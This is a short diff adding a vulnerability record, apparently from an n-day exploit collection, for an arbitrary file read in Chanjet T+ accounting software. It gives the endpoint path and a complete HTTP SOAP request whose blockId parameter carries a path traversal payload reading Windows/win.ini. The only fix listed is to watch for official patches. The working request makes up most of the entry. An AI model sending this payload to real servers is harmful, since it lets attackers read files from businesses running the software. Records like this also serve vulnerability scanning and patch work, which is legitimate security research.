@@ -1,0 +1,13 @@
+vendor = "畅捷通"
+name = "畅捷通T+ DownLoadBlockFile 任意文件读取漏洞"
+type = "任意文件读取"
+path = "/tplus/GLSyncService.asmx/DownLoadBlockFile"
+version = ""
+detail = """POST /tplus/GLSyncService.asmx/DownLoadBlockFile HTTP/1.1 Host: target Content-Type: text/xml
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><DownLoadBlockFile xmlns="http://tempuri.org/"><blockId>../../../../Windows/win.ini</blockId></DownLoadBlockFile></soap:Body></soap:Envelope>"""
+fix = "关注官方补丁"
+date = 20260501
+label = "nday"
+cve = "TVD-2026-10503"
+verifier = "AdySec"
